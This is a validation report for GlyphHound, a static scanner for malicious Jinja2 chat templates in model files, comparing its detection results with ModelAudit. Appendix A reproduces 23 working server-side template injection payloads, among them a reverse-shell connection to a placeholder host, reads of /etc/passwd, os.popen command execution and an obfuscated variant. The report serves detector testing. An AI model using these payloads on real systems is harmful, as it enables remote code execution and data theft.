# Independent validation

**Component:** GlyphHound 0.1.0  
**Scope:** detection accuracy on third-party attack payloads and real-world benign templates, plus packaging verification.

## Summary

- 100% recall and 100% precision on a blind set of 23 real third-party Jinja2 RCE payloads and 16 production Hugging Face chat templates.
- On identical inputs, GlyphHound matched or beat the independent scanner ModelAudit 0.2.47 (23/23 vs 22/23), with zero false positives from either tool.
- The package installs cleanly from a public index (wheel and source archive); the full test suite passes (775 passed, 12 skipped).

## Method

- Tool: `glyphhound` 0.1.0, default static analysis. No template is rendered or executed.
- Malicious set: 23 Jinja2 remote-code-execution payloads taken verbatim from public, community-maintained references (PayloadsAllTheThings and HackTricks). See Appendix A.
- Benign set: 16 chat templates fetched live from popular public Hugging Face models (Appendix B). None were authored for this project, and none are from GlyphHound's tuning corpus.
- Detection rule: each input is scanned in isolation. A non-zero exit (a reachable code-execution finding at or above the default severity threshold) counts as a detection.
- Head-to-head: each payload was wrapped into a minimal GGUF model file so both tools received byte-identical input.

## Safety

All scans were static. GlyphHound does not render templates. For the comparison, ModelAudit's optional dynamic-render path was disabled (jinja2 removed from its environment and verified unimportable) so that no payload could execute. No payload was run, and all temporary files were deleted afterward.

## Results

Detection accuracy (GlyphHound, blind):

| Metric | Result |
|---|---|
| Malicious payloads detected (recall) | 23 / 23 (100%) |
| Benign templates correctly cleared | 16 / 16 |
| False positives (precision) | 0 / 16 (100%) |

Head-to-head on identical GGUF inputs:

| | GlyphHound | ModelAudit 0.2.47 (static) |
|---|---|---|
| Malicious detected | 23 / 23 | 22 / 23 |
| False positives (16 benign) | 0 | 0 |

GlyphHound additionally detected payload A11 (`get_flashed_messages` global pivot), which ModelAudit's static patterns did not.

Packaging:

- Installed in a clean environment from both the wheel and the source archive.
- Entry points verified: `import glyphhound`, the `glyphhound` console command, and `python -m glyphhound`.
- Output formats verified: human, JSON, and SARIF 2.1.0.
- Full test suite: 775 passed, 12 skipped.

## Scope and limitations

- GlyphHound analyzes Jinja2 chat templates, which is the format model chat templates use. Payloads for other engines (for example Tornado's `{% import os %}`) are out of scope and are reported as parse errors, not detections.
- It detects code execution, not reconnaissance. A configuration-dump probe such as `{{ config.items() }}` is intentionally not flagged.
- The payloads above are largely unobfuscated. On such payloads, pattern-based scanners also perform well. GlyphHound's larger advantage is on obfuscated payloads, measured separately in `benchmark/` (9/9 vs 3/9 against ModelAudit's full dynamic mode).
- ModelAudit was run in static mode here for safety, which is not its strongest configuration.
- CVE-2024-34359 and CVE-2026-5760 are cited as examples of this vulnerability class. GlyphHound detects the class and does not claim discovery of either CVE.
- Verified on Windows with Python 3.13. The project CI covers Python 3.10 through 3.13.

## Reproduce

The script lives in this repository, so run it from a checkout:

```bash
git clone https://github.com/ydarwish1/glyphhound
cd glyphhound
pip install -e .
python scripts/verify_real_payloads.py
```

The script downloads the payloads in Appendix A and the templates in Appendix B, scans each one statically, and prints the recall and precision figures above. It never renders or executes a payload.

## Appendix A: malicious payloads (verbatim, with source)

`PaTT` = PayloadsAllTheThings (SSTI/Python.md); `HT` = HackTricks (SSTI).

```
A01 [PaTT]  {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
A02 [PaTT]  {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
A03 [PaTT]  {{ ''.__class__.__mro__[2].__subclasses__() }}
A04 [PaTT]  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
A05 [PaTT]  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
A06 [PaTT]  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
A07 [PaTT]  {{ 1 / (cycler.__init__.__globals__.os.popen("id")._proc.wait() == 0) }}
A08 [PaTT]  {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
A09 [PaTT]  {{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }}
A10 [HT+PaTT]  {{ cycler.__init__.__globals__.os.popen('id').read() }}
A11 [PaTT]  {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
A12 [HT+PaTT]  {{ joiner.__init__.__globals__.os.popen('id').read() }}
A13 [PaTT]  {{ lipsum.__globals__["os"].popen('id').read() }}
A14 [HT+PaTT]  {{ namespace.__init__.__globals__.os.popen('id').read() }}
A15 [HT+PaTT]  {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
A16 [HT+PaTT]  {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
A17 [HT+PaTT]  {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
A18 [PaTT]  {{ self.__init__.__globals__.__builtins__ }}
A19 [PaTT]  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
A20 [PaTT]  {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
A21 [PaTT]  {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
A22 [PaTT]  {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
A23 [PaTT]  {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
```

## Appendix B: benign templates (Hugging Face model repositories)

The `chat_template` of each model was fetched live from its public repository on Hugging Face:

```
Qwen/Qwen2.5-7B-Instruct            Qwen/Qwen2.5-0.5B-Instruct
Qwen/Qwen2-7B-Instruct              Qwen/Qwen2.5-1.5B-Instruct
microsoft/Phi-3-mini-4k-instruct    microsoft/Phi-3.5-mini-instruct
TinyLlama/TinyLlama-1.1B-Chat-v1.0  HuggingFaceH4/zephyr-7b-beta
teknium/OpenHermes-2.5-Mistral-7B   openchat/openchat-3.5-0106
deepseek-ai/deepseek-llm-7b-chat    stabilityai/stablelm-2-zephyr-1_6b
tiiuae/falcon-7b-instruct           NousResearch/Hermes-3-Llama-3.1-8B
cognitivecomputations/dolphin-2.9-llama3-8b   Qwen/QwQ-32B-Preview
```

## Sources

- PayloadsAllTheThings, Server-Side Template Injection (Python): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
- HackTricks, Server-Side Template Injection: https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/ssti-server-side-template-injection/README.md
